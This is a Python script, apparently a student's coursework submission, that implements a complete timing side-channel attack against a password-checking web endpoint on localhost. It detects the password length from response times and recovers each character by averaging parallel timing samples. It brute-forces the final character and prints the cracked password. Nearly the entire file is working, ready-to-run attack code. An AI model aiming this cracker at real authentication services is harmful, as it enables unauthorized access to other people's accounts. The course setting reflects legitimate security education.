"""
Timing Side-Channel Attack Implementation
Course: Attacks on Implementations of Secure Systems
Student ID: 316279942

This module implements a timing side-channel attack to crack passwords
by measuring response times from a vulnerable authentication system.
"""

import requests
import time
import logging
from typing import Dict, Optional, List, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock


# ============================================================================
# Configuration Classes
# ============================================================================

@dataclass
class AttackConfig:
    """Configuration parameters for the timing attack."""

    base_url: str = "http://127.0.0.1/"
    user_name: str = "316279942"
    difficulty: int = 1
    max_password_length: int = 32
    charset: str = "abcdefghijklmnopqrstuvwxyz"
    samples_per_test: int = 5

    # Parallel processing options
    enable_parallel: bool = True
    max_workers: int = 4  # Number of concurrent sample requests per character
    warmup_samples: int = 2  # Warmup requests to stabilize network

    def get_test_url(self, password: str) -> str:
        """Construct test URL with current parameters."""
        return f"{self.base_url}?user={self.user_name}&password={password}&difficulty={self.difficulty}"


# ============================================================================
# Logging Setup
# ============================================================================

class AttackLogger:
    """Centralized logging for timing attack operations."""

    def __init__(self, log_level: int = logging.INFO):
        self.logger = logging.getLogger("TimingAttack")
        self.logger.setLevel(log_level)

        # Console handler with formatting
        console_handler = logging.StreamHandler()
        console_handler.setLevel(log_level)

        formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(message)s',
            datefmt='%H:%M:%S'
        )
        console_handler.setFormatter(formatter)

        self.logger.addHandler(console_handler)

    def info(self, message: str):
        """Log info message."""
        self.logger.info(message)

    def debug(self, message: str):
        """Log debug message."""
        self.logger.debug(message)

    def warning(self, message: str):
        """Log warning message."""
        self.logger.warning(message)

    def error(self, message: str):
        """Log error message."""
        self.logger.error(message)

    def print_separator(self, char: str = "=", length: int = 80):
        """Print a visual separator line."""
        print(char * length)

    def print_header(self, text: str):
        """Print a formatted header."""
        self.print_separator("=")
        print(f"  {text}")
        self.print_separator("=")

    def print_section(self, text: str):
        """Print a formatted section header."""
        self.print_separator("-")
        print(f"  {text}")
        self.print_separator("-")


# ============================================================================
# HTTP Request Handler
# ============================================================================

class RequestHandler:
    """Handles HTTP requests with timing measurements."""

    def __init__(self, logger: AttackLogger):
        self.logger = logger
        self.total_requests = 0
        self._lock = Lock()  # Thread-safe counter

    def send_request(self, url: str) -> requests.Response:
        """
        Send a single HTTP request and return the response.

        Args:
            url: The URL to request

        Returns:
            Response object containing timing and result data
        """
        with self._lock:
            self.total_requests += 1

        try:
            response = requests.get(url, timeout=10)
            return response
        except requests.RequestException as e:
            self.logger.error(f"Request failed: {e}")
            raise

    def measure_timing(self, url: str, samples: int) -> float:
        """
        Measure average response time over multiple samples.

        Args:
            url: The URL to test
            samples: Number of samples to average

        Returns:
            Average response time in seconds
        """
        total_time = 0.0
        for _ in range(samples):
            response = self.send_request(url)
            total_time += response.elapsed.total_seconds()

        return total_time / samples

    def get_request_count(self) -> int:
        """Return total number of requests made."""
        with self._lock:
            return self.total_requests


# ============================================================================
# Password Length Detector
# ============================================================================

class PasswordLengthDetector:
    """Detects password length using timing analysis."""

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def detect_length(self) -> int:
        """
        Detect the password length by testing response times for different lengths.

        Returns:
            Detected password length
        """
        self.logger.print_section("PHASE 1: Password Length Detection")

        timing_data: Dict[int, float] = {}

        for length in range(1, self.config.max_password_length + 1):
            test_password = "a" * length
            test_url = self.config.get_test_url(test_password)

            avg_time = self.request_handler.measure_timing(
                test_url,
                self.config.samples_per_test
            )
            timing_data[length] = avg_time

            self.logger.debug(f"Length {length:2d}: {avg_time:.6f}s")

        # Find length with maximum response time
        detected_length = max(timing_data, key=timing_data.get)

        self.logger.info(f"✓ Detected password length: {detected_length} characters")
        self._print_timing_summary(timing_data, detected_length)

        return detected_length

    def _print_timing_summary(self, timing_data: Dict[int, float], detected: int):
        """Print summary of timing measurements."""
        print("\n  Top 5 Candidates by Response Time:")
        sorted_lengths = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        for i, (length, time_val) in enumerate(sorted_lengths[:5], 1):
            marker = "◄ SELECTED" if length == detected else ""
            print(f"    {i}. Length {length:2d}: {time_val:.6f}s {marker}")


# ============================================================================
# Character Cracker
# ============================================================================

class CharacterCracker:
    """Cracks individual password characters using timing analysis with optional parallel processing."""

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def crack_position(self, current_password: str, password_length: int, position: int) -> str:
        """
        Crack a single character position in the password.

        Args:
            current_password: Password discovered so far
            password_length: Total password length
            position: Current position being cracked (1-indexed)

        Returns:
            The cracked character for this position
        """
        position_start_time = time.time()
        self.logger.info(f"Testing position {position}/{password_length}...")

        # Perform warmup if enabled
        if self.config.warmup_samples > 0:
            self._perform_warmup(current_password, password_length)

        # Test all characters sequentially (parallelization is at sample level)
        timing_data = self._test_all_chars(current_password, password_length)

        # Select character with longest response time
        best_char = max(timing_data, key=timing_data.get)

        position_elapsed = time.time() - position_start_time
        self._print_position_results(timing_data, best_char, position, position_elapsed)

        return best_char

    def _perform_warmup(self, current_password: str, password_length: int):
        """
        Perform warmup requests to stabilize network/server response times.

        Args:
            current_password: Current password prefix
            password_length: Total password length
        """
        self.logger.debug(f"Performing {self.config.warmup_samples} warmup requests...")
        warmup_char = 'a'
        test_password = self._build_test_password(current_password, warmup_char, password_length)
        test_url = self.config.get_test_url(test_password)

        for _ in range(self.config.warmup_samples):
            self.request_handler.send_request(test_url)

    def _test_single_char(self, char: str, current_password: str, password_length: int) -> Tuple[str, float]:
        """
        Test a single character and return its average timing.
        Uses parallel sample collection if enabled.

        Args:
            char: Character to test
            current_password: Current password prefix
            password_length: Total password length

        Returns:
            Tuple of (character, average_time)
        """
        test_password = self._build_test_password(current_password, char, password_length)
        test_url = self.config.get_test_url(test_password)

        if self.config.enable_parallel:
            # Parallel sample collection for this character
            total_time = self._collect_samples_parallel(test_url)
        else:
            # Sequential sample collection
            total_time = self._collect_samples_sequential(test_url)

        avg_time = total_time / self.config.samples_per_test
        return (char, avg_time)

    def _collect_samples_sequential(self, test_url: str) -> float:
        """
        Collect timing samples sequentially (traditional approach).

        Args:
            test_url: URL to test

        Returns:
            Total time across all samples
        """
        total_time = 0.0
        for _ in range(self.config.samples_per_test):
            response = self.request_handler.send_request(test_url)
            total_time += response.elapsed.total_seconds()
        return total_time

    def _collect_samples_parallel(self, test_url: str) -> float:
        """
        Collect timing samples in parallel (faster but requires careful tuning).

        Args:
            test_url: URL to test

        Returns:
            Total time across all samples
        """
        total_time = 0.0

        with ThreadPoolExecutor(max_workers=self.config.max_workers) as executor:
            futures = [
                executor.submit(self.request_handler.send_request, test_url)
                for _ in range(self.config.samples_per_test)
            ]

            for future in as_completed(futures):
                response = future.result()
                total_time += response.elapsed.total_seconds()

        return total_time


    def _test_all_chars(self, current_password: str, password_length: int) -> Dict[str, float]:
        """
        Test all characters sequentially.
        Each character's samples can be collected in parallel if enabled.

        Args:
            current_password: Current password prefix
            password_length: Total password length

        Returns:
            Dictionary mapping characters to average response times
        """
        timing_data: Dict[str, float] = {}
        total_chars = len(self.config.charset)

        for i, char in enumerate(self.config.charset, 1):
            char, avg_time = self._test_single_char(char, current_password, password_length)
            timing_data[char] = avg_time

            # Progress update every 5 characters
            if i % 5 == 0 or i == total_chars:
                self.logger.debug(
                    f"Progress: {i}/{total_chars} characters tested "
                    f"({i/total_chars*100:.0f}%) - Last: '{char}' @ {avg_time:.6f}s"
                )

        return timing_data


    def _build_test_password(self, prefix: str, test_char: str, total_length: int) -> str:
        """Build a test password with padding."""
        remaining_length = total_length - len(prefix) - 1
        return prefix + test_char + ("a" * remaining_length)

    def _print_position_results(self, timing_data: Dict[str, float], best: str, position: int, elapsed: float):
        """Print results for current position."""
        sorted_chars = sorted(timing_data.items(), key=lambda x: x[1], reverse=True)
        best_time = timing_data[best]

        print(f"\n  Top 5 candidates for position {position}:")
        for i, (char, time_val) in enumerate(sorted_chars[:5], 1):
            diff = time_val - best_time
            marker = "◄ SELECTED" if char == best else ""
            print(f"    {i}. '{char}': {time_val:.6f}s (Δ {diff:+.6f}s) {marker}")

        # Show timing statistics
        all_times = list(timing_data.values())
        avg_time = sum(all_times) / len(all_times)
        std_dev = (sum((t - avg_time) ** 2 for t in all_times) / len(all_times)) ** 0.5

        print(f"\n  Timing Statistics:")
        print(f"    Position test time: {elapsed:.2f}s")
        print(f"    Avg response time: {avg_time:.6f}s")
        print(f"    Std deviation: {std_dev:.6f}s")
        print(f"    Best/Worst ratio: {best_time / min(all_times):.3f}x")
        print(f"    Signal strength: {(best_time - avg_time) / std_dev:.2f}σ")


# ============================================================================
# Last Character Verifier
# ============================================================================

class LastCharacterVerifier:
    """Verifies the last character by checking actual authentication."""

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def verify_last_char(self, current_password: str) -> Optional[str]:
        """
        Verify the last character by testing actual authentication.

        Args:
            current_password: Password discovered so far (all except last char)

        Returns:
            The correct last character, or None if not found
        """
        self.logger.print_section(f"PHASE 3: Last Character Verification (Position {len(current_password) + 1})")

        for char in self.config.charset:
            test_password = current_password + char
            test_url = self.config.get_test_url(test_password)

            response = self.request_handler.send_request(test_url)

            if response.text == "1":
                self.logger.info(f"✓ Found correct last character: '{char}'")
                return char

        self.logger.warning("✗ No correct last character found")
        return None


# ============================================================================
# Main Password Cracker
# ============================================================================

class PasswordCracker:
    """Main orchestrator for the password cracking attack."""

    def __init__(self, config: AttackConfig, logger: AttackLogger):
        self.config = config
        self.logger = logger
        self.request_handler = RequestHandler(logger)
        self.length_detector = PasswordLengthDetector(config, self.request_handler, logger)
        self.char_cracker = CharacterCracker(config, self.request_handler, logger)
        self.last_char_verifier = LastCharacterVerifier(config, self.request_handler, logger)

    def crack_from_scratch(self) -> str:
        """
        Crack the entire password from scratch.

        Returns:
            The cracked password
        """
        start_time = time.time()

        self.logger.print_header("TIMING SIDE-CHANNEL PASSWORD CRACKER")
        print(f"  Target User: {self.config.user_name}")
        print(f"  Difficulty: {self.config.difficulty}")
        print(f"  Samples per test: {self.config.samples_per_test}")
        print(f"  Parallel processing: {'ENABLED' if self.config.enable_parallel else 'DISABLED'}")
        if self.config.enable_parallel:
            print(f"  Max workers: {self.config.max_workers}")
            print(f"  Warmup samples: {self.config.warmup_samples}")
        print()

        # Phase 1: Detect password length
        password_length = self.length_detector.detect_length()

        # Phase 2: Crack each character position
        cracked_password = self._crack_all_positions(password_length)

        # Final verification
        elapsed_time = time.time() - start_time
        self._print_final_results(cracked_password, elapsed_time)

        return cracked_password

    def crack_with_resume(self, resume_from: str, password_length: int) -> str:
        """
        Resume cracking from a partially discovered password.

        Args:
            resume_from: Partially discovered password
            password_length: Known password length

        Returns:
            The fully cracked password
        """
        start_time = time.time()

        self.logger.print_header("RESUMING PASSWORD CRACKING")
        print(f"  Target User: {self.config.user_name}")
        print(f"  Difficulty: {self.config.difficulty}")
        print(f"  Samples per test: {self.config.samples_per_test}")
        print(f"  Parallel processing: {'ENABLED' if self.config.enable_parallel else 'DISABLED'}")
        if self.config.enable_parallel:
            print(f"  Max workers: {self.config.max_workers}")
            print(f"  Warmup samples: {self.config.warmup_samples}")
        print(f"  Resume from: '{resume_from}' (Position {len(resume_from) + 1}/{password_length})")
        print()

        cracked_password = self._crack_from_position(resume_from, password_length)

        elapsed_time = time.time() - start_time
        self._print_final_results(cracked_password, elapsed_time)

        return cracked_password

    def _crack_all_positions(self, password_length: int) -> str:
        """Crack all character positions."""
        self.logger.print_section("PHASE 2: Character Position Cracking")

        current_password = ""

        for position in range(1, password_length + 1):
            # Check if this is the last character
            if position == password_length:
                last_char = self.last_char_verifier.verify_last_char(current_password)
                if last_char:
                    current_password += last_char
                    break

            # Crack current position
            next_char = self.char_cracker.crack_position(
                current_password, password_length, position
            )
            current_password += next_char

            self.logger.info(f"✓ Password progress: '{current_password}' ({len(current_password)}/{password_length})")
            print()

        return current_password

    def _crack_from_position(self, resume_from: str, password_length: int) -> str:
        """Crack remaining positions from resume point."""
        current_password = resume_from
        start_position = len(resume_from) + 1

        for position in range(start_position, password_length + 1):
            # Check if this is the last character
            if position == password_length:
                last_char = self.last_char_verifier.verify_last_char(current_password)
                if last_char:
                    current_password += last_char
                    break

            # Crack current position
            next_char = self.char_cracker.crack_position(
                current_password, password_length, position
            )
            current_password += next_char

            self.logger.info(f"✓ Password progress: '{current_password}' ({len(current_password)}/{password_length})")
            print()

        return current_password

    def _print_final_results(self, password: str, elapsed_time: float):
        """Print final results and statistics."""
        self.logger.print_header("ATTACK COMPLETE")
        print(f"  ✓ CRACKED PASSWORD: '{password}'")
        print(f"  ⏱ Total Time: {elapsed_time:.2f} seconds ({elapsed_time/60:.2f} minutes)")
        print(f"  📊 Total Requests: {self.request_handler.get_request_count()}")
        print(f"  ⚡ Avg Time per Request: {elapsed_time/self.request_handler.get_request_count():.4f}s")
        self.logger.print_separator("=")

    def verify_password(self, password: str) -> bool:
        """
        Verify if a password is correct.

        Args:
            password: Password to verify

        Returns:
            True if password is correct, False otherwise
        """
        test_url = self.config.get_test_url(password)
        response = self.request_handler.send_request(test_url)

        is_correct = response.text == "1"
        status = "✓ CORRECT" if is_correct else "✗ INCORRECT"

        self.logger.info(f"Password verification: {status}")
        self.logger.debug(f"Response time: {response.elapsed.total_seconds():.6f}s")

        return is_correct


# ============================================================================
# Main Execution
# ============================================================================

def main():
    """Main execution function."""

    # ========================================================================
    # Configuration - Parallel Processing (CORRECTED STRATEGY)
    # ========================================================================
    # enable_parallel: Parallelizes SAMPLE collection for each character
    # max_workers: Concurrent sample requests (3-4 recommended, higher may add noise)
    # warmup_samples: Requests to stabilize network before testing (2-3 recommended)
    # samples_per_test: Samples per character for timing accuracy (5-10 recommended)
    #
    # CRITICAL: Characters are ALWAYS tested sequentially (one at a time)
    # Only the samples for EACH character can be collected in parallel
    #
    # WHY THIS APPROACH:
    # - Testing different characters simultaneously creates timing interference
    # - Network congestion destroys the timing signals we need
    # - Sample parallelization is safer: same URL, just faster measurement
    #
    # PERFORMANCE:
    # - Sequential samples: ~60-70s per position
    # - Parallel samples (3-4 workers): ~30-40s per position (1.5-2x faster)
    # - Higher worker counts may reduce accuracy (network saturation)
    #
    # RECOMMENDED:
    # - Local testing: enable_parallel=True, max_workers=3-4
    # - Remote server: test both modes, network latency may favor sequential
    # ========================================================================

    config = AttackConfig(
        base_url="http://127.0.0.1/",
        user_name="316279942",
        difficulty=1,
        samples_per_test=5,

        # Parallel processing settings
        enable_parallel=True,      # Set to False for fully sequential mode
        max_workers=3,             # 3-4 workers for sample parallelization
        warmup_samples=2           # Network stabilization
    )

    # Logger (set to logging.DEBUG for more detailed output)
    logger = AttackLogger(log_level=logging.INFO)

    # Initialize cracker
    cracker = PasswordCracker(config, logger)

    # ========================================================================
    # Execution Options
    # ========================================================================

    # Option 1: Crack from scratch (detects length, then cracks all positions)
    cracked_password = cracker.crack_from_scratch()

    # Option 2: Resume from partial password (faster if you already know some chars)
    # resume_from = "boovghcfslcajgf"
    # password_length = 16
    # cracked_password = cracker.crack_with_resume(resume_from, password_length)

    # Final verification
    print()
    logger.print_section("FINAL VERIFICATION")
    cracker.verify_password(cracked_password)


if __name__ == "__main__":
    main()